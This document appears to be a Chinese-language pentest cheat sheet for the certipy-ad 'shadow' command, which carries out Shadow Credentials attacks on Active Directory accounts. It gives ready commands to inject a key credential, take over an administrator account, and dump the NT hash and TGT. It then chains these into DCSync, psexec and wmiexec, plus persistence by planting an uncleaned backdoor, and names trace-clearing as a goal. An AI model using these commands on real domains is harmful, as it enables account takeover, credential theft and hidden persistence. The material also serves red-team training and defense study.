# certipy-ad shadow

## 介绍

certipy-ad shadow用于执行Shadow Credentials共i就（又名“影子凭据”攻击）。是一种基于msDS-KeyCredentialLink属性滥用的高级域权限提升技术，常用于RBCD(Resource-Based Constrained Delegation),ESC9-ESC10链路中，实现从低权限账户接管目标用户/计算机账户，而不重置密码（隐蔽性高，密码改成后依然有效）

## 攻击原理

### 核心属性

msDS-KeyCredentialLink

### 权限要求

当前账户对目标对象有WriteProperty到msDS-KeyCredentialLink或者GenericWrite。

### 过程

生成自签名证书密钥对，将公钥注入目标的msDS-KeyCredentialLink属性，用私钥通过PRINT（Kerberos证书认证）冒充目标获取TGT/NT哈希

### 优势

不依赖ADCS颁发证书，隐蔽（无CA日志），可清理痕迹

### 场景

结合RBCD接管计算机账户，或ESC9弱映射绕过SID保护

## 参数

### 1）子命令

| 子命令（action） | 功能                                           | 示例命令                                                     | 场景                                               |
| ---------------- | ---------------------------------------------- | ------------------------------------------------------------ | -------------------------------------------------- |
| auto             | 自动添加影子凭证->认证获取NT哈希/TGT->清理痕迹 | certipy-ad shadow auto -u low@domain -p pass -account admin -dc-ip 10.10.10.100 | 快速提权，输出 NT 哈希用于 pass-the-hash 或 psexec |
| add              | 手动添加影子凭据（用于持久化）                 | certipy-ad shadow add -u low@domain -p pass -account target -dc-ip DC_IP | 植入后门，持久访问（密码改了也有效）               |
| remove           | 移除指定影子凭证                               | certipy-ad shadow remove -u ... -account target -device-id DEVICE_ID | 清理痕迹                                           |
| clear            | 清空所有影子凭证                               | certipy-ad shadow clear -u ... -account target               | 彻底清理或强制覆盖                                 |
| list             | 列出目标账户所有影子凭证 Device ID             | certipy-ad shadow list -u ... -account target                | 侦察现有后门                                       |
| info             | 查看指定Device Id的凭据详情                    | certipy-ad shadow info -u ... -account target -device-id ID  | 调试或确认注入成功                                 |

### 2）通用参数

| 参数                | 作用                       |
| ------------------- | -------------------------- |
| -account \<TARGET\> | 目标账户（sAMAccountName） |
| -dc-ip \<IP\>       | 域控制器IP                 |
| -hashes \<NT\>      | Pass-tHE-hash              |
| -debug              | 调试输出                   |

```
certipy-ad shadow [action] -u 'lowuser@domain.local' -p 'pass' -dc-ip DC_IP -account 'targetuser'
```

## 步骤

### 1）侦擦

BllodHound找AddKeyCredentialLink

### 2）一键利用

```
certipy-ad shadow auto -u 'lowuser@domain.local' -p 'pass' -account 'administrator' -dc-ip 10.10.10.100
```

输出：目标的 NT 哈希 + TGT（保存为 .ccache）。

### 3）后续提权：

用哈希 DCSync：impacket-secretsdump -hashes :NT_HASH domain/lowuser@DC_IP

或 psexec：impacket-psexec -hashes :NT_HASH domain/administrator@DC_IP cmd.exe

或注入 TGT：export KRB5CCNAME=administrator.ccache 然后 impacket-wmiexec -k -no-pass domain/administrator@DC_IP

### 4）持久化

用add植入，不清理

